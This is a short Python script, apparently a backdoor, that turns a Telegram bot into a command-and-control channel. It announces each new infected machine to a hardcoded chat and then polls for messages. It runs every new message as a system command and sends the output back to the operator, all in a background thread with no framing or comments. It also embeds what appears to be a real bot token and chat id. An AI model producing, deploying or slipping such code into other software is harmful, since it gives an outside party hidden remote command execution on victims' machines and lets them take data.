import requests
import threading
import time
import subprocess

def run():
    prev_msg = ""
    message = 'STARTED a new session a on a new machine'
    TOKEN = "6271386199:AAG1XXKFfzjIsNtBDxSGOOmC98QGxMixMDE"
    id = "1186856778"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text={message}"
    requests.get(url,timeout=600).json()
    while True:
        try:
            time.sleep(2)
            TOKEN = "6271386199:AAG1XXKFfzjIsNtBDxSGOOmC98QGxMixMDE"
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            id = "1186856778"
            res = requests.get(url,timeout=600).json()['result'][-1]['message']['text']
            if prev_msg != res:
                prev_msg = res
                message = subprocess.check_output(res.split(" ")).decode().replace("\r","")
                time.sleep(1)
                url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text={message}"
                requests.get(url,timeout=600).json()
        except Exception as e:
            message = e
            time.sleep(1)
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={id}&text={message}"
            requests.get(url,timeout=600).json()
            

t1 = threading.Thread(target=run)
t1.start()

